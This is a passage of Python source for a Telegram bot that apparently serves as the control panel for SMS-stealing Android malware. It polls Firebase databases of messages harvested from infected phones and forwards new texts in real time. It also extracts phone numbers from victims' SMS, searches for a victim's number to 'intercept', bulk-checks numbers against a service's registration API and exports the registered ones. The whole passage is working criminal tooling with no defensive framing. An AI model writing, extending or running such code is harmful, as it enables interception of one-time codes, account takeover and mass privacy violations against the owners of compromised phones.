                await update.message.reply_text("⚠️ <b>Network Congestion!</b>\nPlease wait 60 seconds.", parse_mode="HTML")
                return

            async with HEAVY_TASK_LIMITER:
                user_focus.setdefault(bot_token, {}).pop(chat_id, None)
                pending_action[chat_id] = {"action": "scanning_hidden"}
                wait_msg = await update.message.reply_text("🦇 Initiating Deep Scan for Ghost Nodes...\n\nBypassing registry, please wait...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]))
                devices = await get_all_devices(bot_token, chat_id, users_db)
                if chat_id not in pending_action: return 
                target_devices = [d for d in devices if not d.numbers]
                if not target_devices:
                    await wait_msg.edit_text("All nodes are cleanly indexed. No Ghost Nodes found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                    return
                results = []
                kb = []
                phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
                found_count = 0
                for d in target_devices[:50]: 
                    if chat_id not in pending_action: return 
                    smss = await get_device_sms(d, limit=20, max_age_sec=86400) 
                    found_nums = set()
                    sample_sms = ""
                    for sms in smss:
                        body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                        matches = phone_pattern.findall(body)
                        for m in matches:
                            found_nums.add(m)
                            if not sample_sms: sample_sms = body[:40].replace('\n', ' ') + "..."
                    if found_nums:
                        found_count += 1
                        results.append(f"Ghost Node: {d.name} ({d.id[:6]})\nExtracted: {', '.join(found_nums)}\nPacket: {sample_sms}\n")
                        if len(kb) < 90: kb.append([InlineKeyboardButton(f"Extract: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                if found_count == 0:
                    await wait_msg.edit_text("Deep scan finished. No active Ghost Nodes in 24h.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                    return
                kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
                results_text = "🦇 DEEP SCAN RESULTS\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
                if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Data Truncated]"
                await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
            return

        if text.lower() in ("/cancel", "cancel"):
            if chat_id in pending_action:
                pending_action.pop(chat_id)
                await update.message.reply_text("Process terminated.", reply_markup=get_reply_menu(chat_id))
            else:
                await update.message.reply_text("No active process.")
            return

        if not action: return
        
        if action == "search_live_number":
            pending_action.pop(chat_id)
            clean_search = re.sub(r"\D", "", text)[-10:]
            if len(clean_search) < 10:
                await update.message.reply_text("❌ Invalid MSISDN structure.")
                return
            wait_msg = await update.message.reply_text(f"⏳ Pinging databases for <code>+{clean_search}</code>...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]), parse_mode="HTML")
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            found_devs = [d for d in all_devices if any(clean_search in num for num in d.numbers) and d.status == "online"]
            if not found_devs:
                await wait_msg.edit_text(f"📭 Target <code>+{clean_search}</code> offline.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
                return
            rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            await wait_msg.edit_text(f"🔍 <b>Target Traced:</b> <code>+{clean_search}</code>\nSelect below to intercept:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
            return
        
        if action == "check_number_input":
            if HEAVY_TASK_LIMITER.locked():
                await update.message.reply_text("⚠️ <b>Network Congestion!</b>\nTry again in 60 seconds.", parse_mode="HTML")
                return
            async with HEAVY_TASK_LIMITER:
                raw_nums = re.sub(r"\D", " ", text).split()
                target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
                if not target_nums:
                    await update.message.reply_text("❌ Invalid input!")
                    return
                service = state["service"]
                pending_action.pop(chat_id)
                pending_action[chat_id] = {"action": "bulk_checking"}
                if len(target_nums) == 1:
                    number = target_nums[0]
                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Exploiting {number}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]))
                    res = await check_number_api(service, number)
                    is_error = res.get("status") == "error"
                    ms = res.get("ms", 0)
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
                    kb = []
                    if not is_reg and not is_error:
                        kb.append([InlineKeyboardButton("🔍 Trace Target on Network", callback_data=f"search_num:{number}")])
                    kb.append([InlineKeyboardButton("🔄 Inject Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("💻 Main Terminal", callback_data="open_checker_menu")])
                    await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                else:
                    total_bulk = len(target_nums)
                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Injecting {total_bulk} targets on {service.capitalize()}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]))
                    bulk_results = []
                    registered_list = []
                    BATCH_SIZE = 50 
                    for i in range(0, total_bulk, BATCH_SIZE):
                        if chat_id not in pending_action: return 
                        batch = target_nums[i:i+BATCH_SIZE]
                        tasks = [check_number_api(service, num) for num in batch]
                        res_list = await asyncio.gather(*tasks, return_exceptions=True)
                        for num, res in zip(batch, res_list):
                            if isinstance(res, Exception) or res.get("status") == "error":
                                bulk_results.append(f"❌ <code>{num}</code> - Error")
                                continue
                            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                            stat = "Reg" if is_reg else "UNREG"
                            bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {stat}")
                            if is_reg: registered_list.append(num)
                        await asyncio.sleep(0.5)
                    if chat_id not in pending_action: return 
                    res_text = f"<b>📊 BULK INJECT RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
                    if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
                    kb = [[InlineKeyboardButton("🔄 Inject Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("💻 Main Terminal", callback_data="open_checker_menu")]]
                    await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                    if registered_list and chat_id in ADMIN_IDS:
                        file_name = f"Registered_{service.upper()}_Bulk.txt"
                        file_path = os.path.join(SYS_DIR, file_name)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write("\n".join(list(set([f"+91{num[-10:]}" for num in registered_list]))))
                        try: await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename=file_name, caption=f"📁 Scraped SECURE Targets ({service.upper()})")
                        except: pass
            return

        if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
            pending_action.pop(chat_id)
            urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
            firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
            if not firebase_urls:
                await update.message.reply_text("Invalid payload structure.")
                return
            global_list = SETTINGS.get("global_panels", [])
            global_list.extend(firebase_urls)
            SETTINGS["global_panels"] = global_list
            save_settings()
            await update.message.reply_text(f"✅ SUCCESS! {len(firebase_urls)} payloads injected to Global Core.")
            return

        if action == "set_personal_db":
            urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
            firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
            if not firebase_urls:
                await update.message.reply_text("❌ Invalid Input!")
                return
            pending_action.pop(chat_id)
            expiry_time = time.time() + (86400 * 365) 
            for custom_url in firebase_urls:
                new_entry = {"url": custom_url, "expiry": expiry_time}
                users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append(new_entry)
            save_user(chat_id)
            await update.message.reply_text(f"✅ {len(firebase_urls)} Private Nodes Connected!\n\nOpen 'Devices List' to ping your network.", reply_markup=get_reply_menu(chat_id))
            return
    except: pass

# ═══════════════════════════════════════════════════════
#  FIREBASE POLL — CHUNK ENGINE
# ═══════════════════════════════════════════════════════

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True
        )
        
        if r_main is None and r_user is None and r_root is None: return
            
        devices_in_db = GLOBAL_DEVICE_CACHE.get("ALL", [])
        device_map = {d.id: d for d in devices_in_db if d.db_tag == tag}
        
        for bulk_data in (r_main, r_user, r_root):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = seen_key(dev_id, k)
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    
                    is_recent = False
                    sms_ts = sms.get("timestamp")
                    if sms_ts:
                        try:
                            t_val = float(sms_ts)
                            if t_val > 1e11: t_val /= 1000
                            if (time.time() - t_val) <= 120:  
                                is_recent = True
                        except: pass
                        
                    if not is_recent: continue
                    if device:
                        try: await _forward_sms(device, sms)
                        except: pass
                            
        type4_devs = [d for d in devices_in_db if d.db_tag == tag and d.sms_path.endswith("receivedSms")]
        if type4_devs:
            async def fetch_t4_sms(d: Device):
                sms_dict = await fb_get(d.sms_path, d.base_url)
                if isinstance(sms_dict, dict):
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = seen_key(d.id, k)
                        if sk in seen_ids: continue
                        seen_ids.add(sk)
                        
                        sms_ts = sms.get("timestamp")
                        is_rec = False
                        if sms_ts:
                            try:
                                t_val = float(sms_ts)
                                if t_val > 1e11: t_val /= 1000
                                if (time.time() - t_val) <= 120: is_rec = True
                            except: pass
                        if not is_rec: continue
                        try: await _forward_sms(d, sms)
                        except: pass
            
            t4_chunks = [type4_devs[i:i+CHUNK_SIZE] for i in range(0, len(type4_devs), CHUNK_SIZE)]
            for chunk in t4_chunks:
                await asyncio.gather(*(fetch_t4_sms(d) for d in chunk), return_exceptions=True)
                await asyncio.sleep(0.1)
    except: pass

async def poll_loop(app: Application) -> None:
    global _main_app
    _main_app = app
    print("🚀 Black Hacker Super-Engine Started!")
    while True:
        if not POLL_LOCK.locked():
            async with POLL_LOCK:
                try:
                    active_urls = set()
                    for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
                        if d.status == "online": active_urls.add((d.db_tag, d.base_url))
                    
                    if active_urls:
                        active_list = list(active_urls)
                        for i in range(0, len(active_list), 50): 
                            chunk = active_list[i:i + 50]
                            tasks = [poll_single_db(tag, url) for tag, url in chunk]
                            await asyncio.gather(*tasks, return_exceptions=True)
                            await asyncio.sleep(0.5)
                except: pass
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════
#  RAILWAY WEB SERVER
# ═══════════════════════════════════════════════════════

async def health_check(request):
    return web.Response(text="Bot is running! Hacker Panel Active.")

async def start_web_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get("PORT", 8080))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        print(f"✅ Web server started on port {port} (Railway Alive)")
    except Exception as e:
        pass

# ═══════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("TOKEN is missing!")

    if sys.platform == 'win32':
        try: asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        except: pass

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(4096)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("admin",   cmd_admin))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(start_web_server())   
        asyncio.create_task(global_cache_loop())  
        asyncio.create_task(poll_loop(application)) 
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(hourly_admin_backup(application))

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
